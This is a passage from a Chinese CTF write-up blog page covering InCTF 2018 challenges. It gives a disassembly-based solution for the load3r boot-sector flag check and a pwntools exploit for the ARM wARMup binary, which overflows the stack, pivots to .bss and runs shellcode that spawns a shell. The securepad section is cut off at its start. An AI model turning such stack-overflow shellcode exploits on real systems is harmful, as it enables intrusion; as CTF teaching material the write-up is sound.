@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="referrer" content="no-referrer" />
+    <meta name="description" content="不算太难的几个题，不过其中一个设为群内题，还是写一下WP，毕竟自己挖的坑自己填 0x01 load3r无法直接运行猜测是类似网鼎第一场的Re使用qemu运行程序: 1qemu-system-i386 -drive format&#x3D;raw,file&#x3D;.&#x2F;boot_try.bin 程序是让我们输入flag并进行判断IDA 16模式下载入看到主要是两个函数: 12sub_11">
+<meta property="og:type" content="article">
+<meta property="og:title" content="InCTF2018_load3r&amp;&amp;wARMup&amp;&amp;securepad">
+<meta property="og:url" content="http://yoursite.com/2018/10/19/InCTF2018-load3r-wARMup-securepad/index.html">
+<meta property="og:site_name" content="Kirin&#39;s Blog">
+<meta property="og:description" content="不算太难的几个题，不过其中一个设为群内题，还是写一下WP，毕竟自己挖的坑自己填 0x01 load3r无法直接运行猜测是类似网鼎第一场的Re使用qemu运行程序: 1qemu-system-i386 -drive format&#x3D;raw,file&#x3D;.&#x2F;boot_try.bin 程序是让我们输入flag并进行判断IDA 16模式下载入看到主要是两个函数: 12sub_11">
+<meta property="article:published_time" content="2018-10-19T10:09:21.000Z">
+<meta property="article:modified_time" content="2018-10-20T15:11:04.000Z">
+<meta property="article:author" content="Kirin">
+<meta property="article:tag" content="Re">
+<meta property="article:tag" content="PWN">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>InCTF2018_load3r&amp;&amp;wARMup&amp;&amp;securepad</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2018/10/23/HITCON2018-Tcache/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2018/09/21/unlink-FreeNote/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/10/19/InCTF2018-load3r-wARMup-securepad/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/10/19/InCTF2018-load3r-wARMup-securepad/&text=InCTF2018_load3r&amp;&amp;wARMup&amp;&amp;securepad" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/10/19/InCTF2018-load3r-wARMup-securepad/&title=InCTF2018_load3r&amp;&amp;wARMup&amp;&amp;securepad" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/10/19/InCTF2018-load3r-wARMup-securepad/&is_video=false&description=InCTF2018_load3r&amp;&amp;wARMup&amp;&amp;securepad" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=InCTF2018_load3r&amp;&amp;wARMup&amp;&amp;securepad&body=Check out this article: http://yoursite.com/2018/10/19/InCTF2018-load3r-wARMup-securepad/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/10/19/InCTF2018-load3r-wARMup-securepad/&title=InCTF2018_load3r&amp;&amp;wARMup&amp;&amp;securepad" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/10/19/InCTF2018-load3r-wARMup-securepad/&title=InCTF2018_load3r&amp;&amp;wARMup&amp;&amp;securepad" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/10/19/InCTF2018-load3r-wARMup-securepad/&title=InCTF2018_load3r&amp;&amp;wARMup&amp;&amp;securepad" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/10/19/InCTF2018-load3r-wARMup-securepad/&title=InCTF2018_load3r&amp;&amp;wARMup&amp;&amp;securepad" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/10/19/InCTF2018-load3r-wARMup-securepad/&name=InCTF2018_load3r&amp;&amp;wARMup&amp;&amp;securepad&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-load3r"><span class="toc-number">1.</span> <span class="toc-text">0x01 load3r</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-wARMup"><span class="toc-number">2.</span> <span class="toc-text">0x02 wARMup</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-securepad"><span class="toc-number">3.</span> <span class="toc-text">0x03 securepad</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#解法一"><span class="toc-number">3.1.</span> <span class="toc-text">解法一</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#解法二"><span class="toc-number">3.2.</span> <span class="toc-text">解法二</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        InCTF2018_load3r&amp;&amp;wARMup&amp;&amp;securepad
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Kirin's Blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2018-10-19T10:09:21.000Z" itemprop="datePublished">2018-10-19</time>
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/CTF/" rel="tag">CTF</a>, <a class="tag-link" href="/tags/PWN/" rel="tag">PWN</a>, <a class="tag-link" href="/tags/Re/" rel="tag">Re</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>不算太难的几个题，不过其中一个设为群内题，还是写一下WP，毕竟自己挖的坑自己填</p>
+<h3 id="0x01-load3r"><a href="#0x01-load3r" class="headerlink" title="0x01 load3r"></a>0x01 load3r</h3><p>无法直接运行<br>猜测是类似网鼎第一场的Re<br>使用qemu运行程序:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-i386 -drive format&#x3D;raw,file&#x3D;.&#x2F;boot_try.bin</span><br></pre></td></tr></table></figure>
+<p>程序是让我们输入flag并进行判断<br>IDA 16模式下载入<br>看到主要是两个函数:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sub_11b</span><br><span class="line">sub_128</span><br></pre></td></tr></table></figure>
+<p>主要看一下sub_128(分析在注释里)：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line">seg000:0128 sub_128         proc near               ; CODE XREF: seg000:0011↑p</span><br><span class="line">seg000:0128                                         ; sub_128+1D↓j</span><br><span class="line">seg000:0128                 mov     ah, 1</span><br><span class="line">seg000:012A                 int     16h             ; KEYBOARD - CHECK BUFFER, DO NOT CLEAR</span><br><span class="line">seg000:012A                                         ; Return: ZF clear if character in buffer</span><br><span class="line">seg000:012A                                         ; AH &#x3D; scan code, AL &#x3D; character</span><br><span class="line">seg000:012A                                         ; ZF set if no character in buffer</span><br><span class="line">seg000:012C                 mov     ah, 0</span><br><span class="line">seg000:012E                 int     16h             ; KEYBOARD - READ CHAR FROM BUFFER, WAIT IF EMPTY</span><br><span class="line">seg000:012E                                         ; Return: AH &#x3D; scan code, AL &#x3D; character</span><br><span class="line">seg000:0130                 mov     ds:6Dh, al</span><br><span class="line">seg000:0133                 mov     [bx+6Fh], al    ; 这里不是string整个读入，而是逐个接收键盘输入，因此要一次性输入正确字符串，否则依然不正确</span><br><span class="line">seg000:0137                 cmp     byte ptr ds:6Dh, 0Dh;回车符</span><br><span class="line">seg000:013C                 jz      short loc_147</span><br><span class="line">seg000:013E                 inc     bx</span><br><span class="line">seg000:013F                 mov     si, 6Dh ; &#39;m&#39;</span><br><span class="line">seg000:0142                 call    sub_11B      ;类似检验输入是否正常</span><br><span class="line">seg000:0145                 jmp     short sub_128</span><br><span class="line">seg000:0147 ; ---------------------------------------------------------------------------</span><br><span class="line">seg000:0147</span><br><span class="line">seg000:0147 loc_147:                                ; CODE XREF: sub_128+14↑j</span><br><span class="line">seg000:0147                 mov     ah, 0Eh</span><br><span class="line">seg000:0149                 mov     al, 0Ah</span><br><span class="line">seg000:014B                 int     10h             ; - VIDEO - WRITE CHARACTER AND ADVANCE CURSOR (TTY WRITE)</span><br><span class="line">seg000:014B                                         ; AL &#x3D; character, BH &#x3D; display page (alpha modes)</span><br><span class="line">seg000:014B                                         ; BL &#x3D; foreground color (graphics modes)</span><br><span class="line">seg000:014D                 cmp     bx, 22h ; &#39;&quot;&#39;</span><br><span class="line">seg000:0150                 jz      short loc_154   ; 判断输入长度为0x22</span><br><span class="line">seg000:0152                 jmp     short loc_184</span><br><span class="line">seg000:0154 ; ---------------------------------------------------------------------------</span><br><span class="line">seg000:0154</span><br><span class="line">seg000:0154 loc_154:                                ; CODE XREF: sub_128+28↑j</span><br><span class="line">seg000:0154                 mov     ax, 0</span><br><span class="line">seg000:0157                 mov     bx, 0</span><br><span class="line">seg000:015A                 mov     si, 6Fh ; &#39;o&#39;   ; si&#x3D;input_addr</span><br><span class="line">seg000:015D</span><br><span class="line">seg000:015D loc_15D:                                ; CODE XREF: sub_128+4A↓j</span><br><span class="line">seg000:015D                                         ; sub_128+54↓j</span><br><span class="line">seg000:015D                 mov     al, 31h ; &#39;1&#39;</span><br><span class="line">seg000:015F                 cmp     [bx+0C9h], al   ; 以bx+0xc9处&quot;0&quot;和&quot;1&quot;字符串为key，逐位与1比较</span><br><span class="line">seg000:0163                 jz      short loc_174</span><br><span class="line">seg000:0165                 lodsb</span><br><span class="line">seg000:0166                 shr     al, 1           ; 为1，则input[i]&gt;&gt;1</span><br><span class="line">seg000:0168                 mov     [bx+0EEh], al</span><br><span class="line">seg000:016C                 inc     bx</span><br><span class="line">seg000:016D                 cmp     bx, 23h ; &#39;#&#39;</span><br><span class="line">seg000:0170                 jz      short loc_1A8</span><br><span class="line">seg000:0172                 jmp     short loc_15D</span><br><span class="line">seg000:0174 ; ---------------------------------------------------------------------------</span><br><span class="line">seg000:0174</span><br><span class="line">seg000:0174 loc_174:                                ; CODE XREF: sub_128+3B↑j</span><br><span class="line">seg000:0174                 lodsb</span><br><span class="line">seg000:0175                 shl     al, 1           ; 为0，则input[i]&lt;&lt;1</span><br><span class="line">seg000:0177                 mov     [bx+0EEh], al</span><br><span class="line">seg000:017B                 inc     bx</span><br><span class="line">seg000:017C                 jmp     short loc_15D</span><br><span class="line">seg000:017E ; ---------------------------------------------------------------------------</span><br><span class="line">seg000:017E                 mov     si, 0EEh</span><br><span class="line">seg000:0181                 call    sub_11B</span><br><span class="line">seg000:0184</span><br><span class="line">seg000:0184 loc_184:                                ; CODE XREF: sub_128+2A↑j</span><br><span class="line">seg000:0184                                         ; sub_128+A1↓j</span><br><span class="line">seg000:0184                 mov     ah, 0Eh</span><br><span class="line">seg000:0186                 mov     al, 0Dh</span><br><span class="line">seg000:0188                 int     10h             ; - VIDEO - WRITE CHARACTER AND ADVANCE CURSOR (TTY WRITE)</span><br><span class="line">seg000:0188                                         ; AL &#x3D; character, BH &#x3D; display page (alpha modes)</span><br><span class="line">seg000:0188                                         ; BL &#x3D; foreground color (graphics modes)</span><br><span class="line">seg000:018A                 mov     si, 65h ; &#39;e&#39;</span><br><span class="line">seg000:018D                 call    sub_11B</span><br><span class="line">seg000:0190                 jmp     short locret_1D3</span><br><span class="line">seg000:0192 ; ---------------------------------------------------------------------------</span><br><span class="line">seg000:0192</span><br><span class="line">seg000:0192 loc_192:                                ; CODE XREF: sub_128+A6↓j</span><br><span class="line">seg000:0192                 mov     ah, 0Eh</span><br><span class="line">seg000:0194                 mov     al, 0Dh</span><br><span class="line">seg000:0196                 int     10h             ; - VIDEO - WRITE CHARACTER AND ADVANCE CURSOR (TTY WRITE)</span><br><span class="line">seg000:0196                                         ; AL &#x3D; character, BH &#x3D; display page (alpha modes)</span><br><span class="line">seg000:0196                                         ; BL &#x3D; foreground color (graphics modes)</span><br><span class="line">seg000:0198                 mov     al, 0Dh</span><br><span class="line">seg000:019A                 int     10h             ; - VIDEO -</span><br><span class="line">seg000:019C                 mov     al, 0Ah</span><br><span class="line">seg000:019E                 int     10h             ; - VIDEO -</span><br><span class="line">seg000:01A0                 mov     si, 4Ch ; &#39;L&#39;</span><br><span class="line">seg000:01A3                 call    sub_11B</span><br><span class="line">seg000:01A6                 jmp     short locret_1D3</span><br><span class="line">seg000:01A8 ; ---------------------------------------------------------------------------</span><br><span class="line">seg000:01A8</span><br><span class="line">seg000:01A8 loc_1A8:                                ; CODE XREF: sub_128+48↑j</span><br><span class="line">seg000:01A8                 mov     bx, 0</span><br><span class="line">seg000:01AB                 mov     si, 0EEh        ; encode(input)_addr</span><br><span class="line">seg000:01AE</span><br><span class="line">seg000:01AE loc_1AE:                                ; CODE XREF: sub_128+94↓j</span><br><span class="line">seg000:01AE                 lodsb</span><br><span class="line">seg000:01AF                 cmp     al, 0</span><br><span class="line">seg000:01B1                 jz      short loc_1BE</span><br><span class="line">seg000:01B3                 mov     ah, 0Eh</span><br><span class="line">seg000:01B5                 xor     al, 5           ; 经加密后的input每一位xor 5</span><br><span class="line">seg000:01B7                 mov     [bx+9Ch], al</span><br><span class="line">seg000:01BB                 inc     bx</span><br><span class="line">seg000:01BC                 jmp     short loc_1AE</span><br><span class="line">seg000:01BE ; ---------------------------------------------------------------------------</span><br><span class="line">seg000:01BE</span><br><span class="line">seg000:01BE loc_1BE:                                ; CODE XREF: sub_128+89↑j</span><br><span class="line">seg000:01BE                 mov     bx, 21h ; &#39;!&#39;</span><br><span class="line">seg000:01C1                 mov     si, 9Ch</span><br><span class="line">seg000:01C4</span><br><span class="line">seg000:01C4 loc_1C4:                                ; CODE XREF: sub_128+A9↓j</span><br><span class="line">seg000:01C4                 lodsb</span><br><span class="line">seg000:01C5                 cmp     al, [bx+27h]</span><br><span class="line">seg000:01C9                 jnz     short loc_184</span><br><span class="line">seg000:01CB                 cmp     bx, 0</span><br><span class="line">seg000:01CE                 jz      short loc_192</span><br><span class="line">seg000:01D0                 dec     bx              ; 逆序比较</span><br><span class="line">seg000:01D1                 jmp     short loc_1C4</span><br><span class="line">seg000:01D3 ; ---------------------------------------------------------------------------</span><br><span class="line">seg000:01D3</span><br><span class="line">seg000:01D3 locret_1D3:                             ; CODE XREF: sub_11B+5↑j</span><br><span class="line">seg000:01D3                                         ; sub_128+68↑j ...</span><br><span class="line">seg000:01D3                 retn</span><br><span class="line">seg000:01D3 sub_128         endp</span><br></pre></td></tr></table></figure>
+<p>大致过程就是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">接收输入</span><br><span class="line">利用预先定义的一组&quot;01&quot;对字符串逐位移位处理</span><br><span class="line">将上一步结果逐位xor 5</span><br><span class="line">最终与预先定义的字符串逆序比较</span><br></pre></td></tr></table></figure>
+<p>提取数据脚本逆一下过程即可：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">key&#x3D;[</span><br><span class="line">  0x77, 0x32, 0x67, 0x31, 0x6B, 0x53, 0x3C, 0x63, 0x37, 0x6D, </span><br><span class="line">  0x65, 0x33, 0x6B, 0x65, 0x65, 0x75, 0x53, 0x4D, 0x67, 0x31, </span><br><span class="line">  0x6B, 0x53, 0x6B, 0x25, 0x53, 0x65, 0x3C, 0x3D, 0x53, 0x33, </span><br><span class="line">  0x25, 0x2F, 0x65, 0x2F</span><br><span class="line">]</span><br><span class="line">key2&#x3D;[</span><br><span class="line">  0x30, 0x31, 0x30, 0x30, 0x30, 0x31, 0x30, 0x30, 0x31, 0x31, </span><br><span class="line">  0x30, 0x31, 0x31, 0x31, 0x30, 0x31, 0x31, 0x31, 0x31, 0x31, </span><br><span class="line">  0x31, 0x31, 0x30, 0x31, 0x31, 0x30, 0x31, 0x30, 0x31, 0x31, </span><br><span class="line">  0x30, 0x31, 0x30, 0x31</span><br><span class="line"> ]</span><br><span class="line">ans&#x3D;&quot;&quot;</span><br><span class="line">for i in range(34):</span><br><span class="line">	if key2[33-i]&#x3D;&#x3D;0x30:</span><br><span class="line">		ans+&#x3D;chr((key[i]^5)&lt;&lt;1)</span><br><span class="line">	else:</span><br><span class="line">		ans+&#x3D;chr((key[i]^5)&gt;&gt;1)</span><br><span class="line">print ans[::-1]</span><br></pre></td></tr></table></figure>
+<h3 id="0x02-wARMup"><a href="#0x02-wARMup" class="headerlink" title="0x02 wARMup"></a>0x02 wARMup</h3><p>载入IDA,可以看到是一个arm程序<br>给出了lib文件夹，且文件夹下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ld-linux-armhf.so.3</span><br><span class="line">libc.so.6</span><br></pre></td></tr></table></figure>
+<p>运行程序：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">qemu-arm -L .&#x2F;  .&#x2F;wARMup</span><br><span class="line">#-L dir 指向BIOS和VGA BIOS所在目录</span><br><span class="line">result:</span><br><span class="line">Welcome to bi0s CTF!</span><br><span class="line">#接收输入</span><br></pre></td></tr></table></figure>
+<p>IDA看到main函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char buf; &#x2F;&#x2F; [sp+4h] [bp-68h]</span><br><span class="line"></span><br><span class="line">  alarm(0x1Eu);</span><br><span class="line">  setvbuf((FILE *)_bss_start, 0, 2, 0);</span><br><span class="line">  puts(&quot;Welcome to bi0s CTF!&quot;);</span><br><span class="line">  read(0, &amp;buf, 0x78u);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>程序保护</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     arm-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x10000)</span><br></pre></td></tr></table></figure>
+<p><strong>明显的栈溢出<br>不过这里只能溢出16字节<br>我们可以先迁移栈到一个已知且可写可执行的地址<br>而后复用main中的read，将shellcode写入此地址<br>再ret入shellcode即可<br>调试：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">qemu-arm -g 1234 -L .&#x2F;  .&#x2F;wARMup</span><br><span class="line">#localhost:1234</span><br><span class="line">而后IDA连接gdb debugger即可远程调试</span><br><span class="line">或者：</span><br><span class="line">gdb-multiarch</span><br><span class="line">set architecture arm</span><br><span class="line">target remote localhost:1234</span><br></pre></td></tr></table></figure>
+<p><strong>EXP:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;.&#x2F;wARMup&quot;)</span><br><span class="line">libc &#x3D; ELF(&quot;.&#x2F;lib&#x2F;libc.so.6&quot;)</span><br><span class="line">p &#x3D; process([&quot;qemu-arm&quot;, &quot;-L&quot;, &quot;.&#x2F;&quot;, &quot;.&#x2F;wARMup&quot;])</span><br><span class="line">shellcode &#x3D; asm(shellcraft.arm.linux.sh(),arch&#x3D;&#39;arm&#39;)</span><br><span class="line">stack_addr &#x3D; elf.bss()+0x500</span><br><span class="line">payload&#x3D;&#39;a&#39;*100+p32(stack_addr)+p32(0x00010364)+p32(stack_addr)+p32(0x10534)</span><br><span class="line">p.recvuntil(&quot;!\n&quot;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(p32(stack_addr-0x4)+shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="0x03-securepad"><a href="#0x03-securepad" class="headerlink" title="0x03 securepad"></a>0x03 securepad</h3><h4 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">switch ( (unsigned int)off_12B8 )</span><br><span class="line"> &#123;</span><br><span class="line">   case 0u:</span><br><span class="line">     exit(0);</span><br><span class="line">     return;</span><br><span class="line">   case 1u:</span><br><span class="line">     authenticate();</span><br><span class="line">     add();</span><br><span class="line">     break;</span><br><span class="line">   case 2u:</span><br><span class="line">     authenticate();</span><br><span class="line">     edit();</span><br><span class="line">     break;</span><br><span class="line">   case 3u:</span><br><span class="line">     authenticate();</span><br><span class="line">     delete();</span><br><span class="line">     break;</span><br><span class="line">   case 4u:</span><br><span class="line">     authenticate();</span><br><span class="line">     view();</span><br><span class="line">     break;</span><br><span class="line">   default:</span><br><span class="line">     puts(&quot;Invalid&quot;);</span><br><span class="line">     break;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+<p>每次操作都会调用authenticate()<br>而authenticate()中：</p>
